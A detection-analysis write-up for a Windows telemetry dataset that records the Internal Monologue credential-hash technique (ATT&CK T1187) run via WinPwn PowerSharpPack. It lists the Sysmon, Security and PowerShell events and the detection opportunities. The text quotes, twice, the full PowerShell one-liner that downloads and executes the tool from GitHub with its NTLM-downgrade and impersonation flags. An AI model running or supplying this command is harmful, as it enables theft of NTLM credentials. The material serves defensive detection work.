# T1187-2: Forced Authentication — WinPwn PowerSharpPack Retrieving NTLM Hashes without Touching LSASS

## Technique Context

Forced Authentication (T1187) via Internal Monologue retrieves NTLM challenge-response hashes from a Windows system by manipulating the NTLM authentication protocol at a local level — specifically by forcing a local NTLM authentication negotiation and capturing the resulting NetNTLMv1 response — without directly reading LSASS memory. This approach evades common credential dumping detections focused on LSASS access. The WinPwn PowerSharpPack implementation packages Internal Monologue as a .NET assembly wrapped in a PowerShell function called `Invoke-Internalmonologue`, downloaded at runtime from the PowerSharpPack GitHub repository. The `-Downgrade true` flag requests NTLM downgrade to NetNTLMv1 (weaker and faster to crack), `-impersonate true` attempts token impersonation, and `-restore true` restores original settings after completion. With Defender enabled, the download of this tool triggers "malicious content" blocking.

## What This Dataset Contains

With Windows Defender disabled, this dataset captures the Internal Monologue download and execution from ACME-WS06.acme.local.

**Full command visible in Security EID 4688:** A child PowerShell (PID 17448) is created with the complete command: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"}`. All three operational parameters are visible.

**Sysmon EID 1:** The same child PowerShell (PID 17448) is captured with file hashes (SHA256: `3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`), confirming the exact PowerShell binary used.

**DNS query confirmation:** In the defended dataset, Sysmon EID 22 captured a DNS query for `raw.githubusercontent.com`. The undefended dataset's Sysmon channel includes EID 22 in the event distribution, confirming the DNS resolution occurred as the tool was downloaded. The full DNS event is part of the dataset on disk.

**File artifacts:** Sysmon EID 11 records two file writes: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` and `StartupProfileData-Interactive` — standard PowerShell initialization artifacts from two separate PowerShell processes.

**Process access events:** Four Sysmon EID 10 events record PowerShell accessing child processes with `GrantedAccess: 0x1FFFFF`.

**PowerShell events:** 126 events (120 EID 4104, 5 EID 4103, 1 EID 4100). The EID 4100 event is notable — in the defended run, this carried the Defender block message "This script contains malicious content." In this undefended run, the EID 4100 event may represent a PowerShell engine error or unexpected termination during script execution, worth examining in the full dataset.

**DLL loading:** 25 Sysmon EID 7 events reflect .NET CLR and Defender DLL loading across the multiple PowerShell processes.

Compared to the defended dataset (39 Sysmon, 12 Security, 52 PowerShell), this undefended run has more PowerShell events (126 vs. 52) reflecting deeper execution, and includes Sysmon EID 3 and EID 22 events confirming successful download activity. The defended run's key distinguishing artifact — the EID 4100 Defender block message — is absent here.

## What This Dataset Does Not Contain

**Internal Monologue execution outcome:** Whether `Invoke-Internalmonologue` successfully retrieved NTLM hashes is not confirmed in the dataset's sampled events. The tool would need to interact with the local NTLM authentication stack, potentially generating LSA process interactions or NTLM negotiation events, none of which appear in the samples.

**LSASS or LSA process access events:** Internal Monologue's design avoids LSASS memory reads, but it does interact with Windows authentication APIs. No Sysmon EID 10 targeting `lsass.exe` or related processes appears in the samples.

**Captured hash values:** If Internal Monologue succeeded in capturing NetNTLMv1 responses, those hash values would typically be printed to stdout. No output capture events appear in this dataset.

**Network listener connection:** Internal Monologue captures hashes locally rather than triggering outbound authentication; no outbound NTLM relay traffic is expected or present.

## Assessment

The primary detection value in this dataset is the Security EID 4688 and Sysmon EID 1 process creation events with the full Internal Monologue invocation visible: the GitHub URL, the function name `Invoke-Internalmonologue`, and all three operational flags (`-Downgrade true -impersonate true -restore true`). This is a high-fidelity detection signal requiring no correlation.

The dataset's runtime download-cradle pattern (`iex(new-object net.webclient).downloadstring(...)` to GitHub) is a broadly applicable detection indicator that would catch this technique family regardless of the specific tool being downloaded. The combination of this pattern with the PowerSharpPack URL or the `Invoke-Internalmonologue` function name narrows it to this specific tool.

Compared to the defended variant (which generated the cleaner "malicious content blocked" artifact), this dataset represents the operationally more challenging scenario: without the AV block event as a detection anchor, security teams must rely on PowerShell script block logging and process creation command-line content. The presence of a DNS query for `raw.githubusercontent.com` in the Sysmon EID 22 data provides an additional detection layer independent of process monitoring.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1:** Child PowerShell with `Invoke-Internalmonologue.ps1` URL and `-Downgrade true -impersonate true -restore true` arguments — all uniquely associated with this technique
- **PowerShell EID 4104:** `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/...')` — the PowerSharpPack URL is a known indicator; any tool from this repository is adversarial
- **Sysmon EID 22 (DNS):** `raw.githubusercontent.com` DNS query from PowerShell running as SYSTEM — unusual for normal workstation operations
- **Sysmon EID 3:** Network connection to `raw.githubusercontent.com:443` from PowerShell is present in the full dataset; high-confidence in SYSTEM context
- **PowerShell EID 4100:** The EID 4100 event in this undefended run warrants analysis — it may indicate partial execution failure or an unexpected condition during Internal Monologue's authentication manipulation
- **PowerShell EID 4103:** `Set-ExecutionPolicy Bypass` and subsequent `Write-Host "DONE"` in SYSTEM context confirm automated adversarial test framework execution
